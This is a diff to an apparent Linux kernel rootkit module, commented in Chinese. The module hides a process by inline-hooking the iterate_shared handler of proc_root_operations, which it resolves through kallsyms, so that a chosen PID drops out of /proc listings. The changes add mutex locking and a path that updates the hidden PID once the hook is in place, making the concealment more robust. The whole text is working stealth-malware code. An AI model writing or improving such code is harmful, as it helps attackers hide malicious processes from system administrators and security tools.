@@ -8,6 +8,7 @@
 #include <linux/dcache.h>
 #include <linux/proc_fs.h>
 #include <linux/version.h>
+#include <linux/mutex.h>
 
 #include "export_fun.h"
 #include "inline_hook_frame.h"
@@ -15,6 +16,7 @@
 static pid_t g_hidden_pid = 0;
 static filldir_t g_orig_actor = NULL;
 static struct hook_entry g_proc_iterate_hook[1];
+static DEFINE_MUTEX(g_hide_process_lock);
 
 // filldir 过滤回调
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
@@ -57,14 +59,24 @@ static int hide_process(pid_t pid)
 {
     struct file_operations *fops;
     unsigned long iterate_addr;
-    int ret;
+    int ret = 0;
+
+    mutex_lock(&g_hide_process_lock);
+
+    if (g_proc_iterate_hook[0].installed)
+    {
+        WRITE_ONCE(g_hidden_pid, pid);
+        pr_debug("hide_process: 更新隐藏 PID %d\n", pid);
+        goto out_unlock;
+    }
 
     fops = (struct file_operations *)
         generic_kallsyms_lookup_name("proc_root_operations");
     if (!fops || !fops->iterate_shared)
     {
         pr_debug("hide_process: proc_root_operations / iterate_shared 不可用\n");
-        return -ENOENT;
+        ret = -ENOENT;
+        goto out_unlock;
     }
 
     iterate_addr = (unsigned long)fops->iterate_shared;
@@ -83,21 +95,26 @@ static int hide_process(pid_t pid)
     if (ret)
     {
         pr_debug("hide_process: inline hook 安装失败 %d\n", ret);
-        return ret;
+        goto out_unlock;
     }
 
     WRITE_ONCE(g_hidden_pid, pid);
     pr_debug("hide_process: 隐藏 PID %d (iterate_shared=%px)\n",
              pid, (void *)iterate_addr);
-    return 0;
+
+out_unlock:
+    mutex_unlock(&g_hide_process_lock);
+    return ret;
 }
 
 // 卸载hook
 static void hide_process_cleanup(void)
 {
+    mutex_lock(&g_hide_process_lock);
     inline_hook_remove(g_proc_iterate_hook);
     WRITE_ONCE(g_hidden_pid, 0);
     g_orig_actor = NULL;
+    mutex_unlock(&g_hide_process_lock);
     pr_debug("hide_process: hook 已卸载\n");
 }
 
